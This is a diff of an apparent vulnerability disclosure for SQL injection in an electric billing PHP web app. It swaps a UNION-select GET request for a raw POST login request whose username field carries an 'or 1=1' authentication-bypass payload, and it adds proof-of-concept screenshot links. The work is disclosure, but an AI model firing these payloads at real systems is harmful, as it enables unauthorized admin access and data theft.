@@ -18,15 +18,27 @@ The reason for the SQL injection vulnerability is that the website application d
 
   Payload used:
   
-  GET /electric_billing_0/electric_billing/?page=tracks&code=-1%27%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2Csqlite_version()%3B HTTP/1.1
+  POST /electric_billing_0/electric_billing/Actions.php?a=login HTTP/1.1
   Host: 192.168.2.107
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
-  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+  Accept: application/json, text/javascript, */*; q=0.01
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Accept-Encoding: gzip, deflate
-  Referer: http://192.168.2.107/electric_billing_0/electric_billing/?page=tracks&code=--1%27%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2Csqlite_version()%3B
+  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  X-Requested-With: XMLHttpRequest
+  Content-Length: 40
+  Origin: http://192.168.2.107
   Connection: close
+  Referer: http://192.168.2.107/electric_billing_0/electric_billing/admin/login.php
   Cookie: PHPSESSID=g06tfgab6s50lnkbbi55rl10bb
-  Upgrade-Insecure-Requests: 1
-  Priority: u=0, i
+  Priority: u=0
+
+  username=admin'+or+'1'%3D'1&password=123
 Proof of Concept
+![image](https://github.com/user-attachments/assets/1fb089d2-a1a1-45a5-a0b4-c18582d7ae52)
+
+![f7e6c0938af23e98a2b858eac7728b7](https://github.com/user-attachments/assets/d3aec4c3-1f54-45ba-a60c-3889e570db1e)
+![image](https://github.com/user-attachments/assets/48c548b5-f81c-42e8-ae57-9f847dbf5702)
+
+
+
